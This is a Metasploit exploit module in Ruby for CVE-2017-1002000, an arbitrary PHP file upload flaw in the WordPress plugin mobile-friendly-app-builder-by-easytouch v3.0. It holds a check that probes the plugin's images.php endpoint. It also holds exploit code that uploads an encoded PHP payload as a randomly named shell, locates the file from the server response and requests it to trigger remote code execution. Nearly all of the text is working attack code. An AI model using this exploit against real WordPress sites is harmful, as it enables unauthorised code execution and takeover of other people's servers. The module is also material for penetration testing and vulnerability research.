##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress Plugin mobile-friendly-app-builder-by-easytouch v3.0 Remote File Upload Exploit',
      'Description'    => %q{
        This module exploits an arbitrary PHP code upload vulnerability in the
        Wordpress Plugin mobile-friendly-app-builder-by-easytouch v3.0.
		The vulnerability allows for arbitrary file upload and remote code execution.
      },
      'Author'         =>
        [
          'Larry W. Cashdollar', # Vulnerability discovery
          'Munir Njiru <munir@alien-within.com>'  # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
		  ['CVE', '2017-1002000'],
          ['EDB', '41540'],
          ['WPVDB', '8771'],
          ['URL', 'https://www.alien-within.com/wordpress-mobile-app-native-exploit/']
        ],
      'Privileged'     => false,
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        => [['Wordpress Plugin mobile-friendly-app-builder-by-easytouch v3.0', {}]],
      'DisclosureDate' => 'March 7 2017',
      'DefaultTarget'  => 0)
    )
  end

  def check
    peer = "#{rhost}:#{rport}"
    uri = normalize_uri(target_uri.path)
    uri << '/' if uri[-1,1] != '/'
    checkScript = send_request_raw({'uri'=>normalize_uri(wordpress_url_plugins, 'mobile-friendly-app-builder-by-easytouch','server','images.php')})
    if checkScript and checkScript.code ==200
      return Exploit::CheckCode::Appears
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    peer = "#{rhost}:#{rport}"
    uri = normalize_uri(target_uri.path)
	p = payload.encoded
    shellName = 'alien'+ rand_text_alpha(4 + rand(4)) + '.php'
    data = Rex::MIME::Message.new
    data.add_part(
      "<?php #{p} ?>",                                   
      'multipart/form-data',                            
      nil,                                               
      "form-data; name=\"file\"; filename=\"#{shellName}\""  
    )
    print_status("Uploading payload (#{p.length.to_s} bytes)...")
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(wordpress_url_plugins, 'mobile-friendly-app-builder-by-easytouch','server','images.php'),
      'ctype'  => "multipart/form-data; boundary=#{data.bound}",
      'data'   => data.to_s
    })
	if not res
      print_error("Hi perpetrator, it seems the victim has a defiant gene")
      return
    end
	respShell=res.body
	respShell["http://example.com/server/images/"]=""
	@shellLoc  = normalize_uri(wordpress_url_plugins, 'mobile-friendly-app-builder-by-easytouch','server','images',respShell.strip)
    print_status("Requesting #{@shellLoc}")
    res = send_request_cgi({'uri'=>@shellLoc})
	
    handler

    if res and res.code == 404
      print_error("Payload failed to upload")
    end
  end

end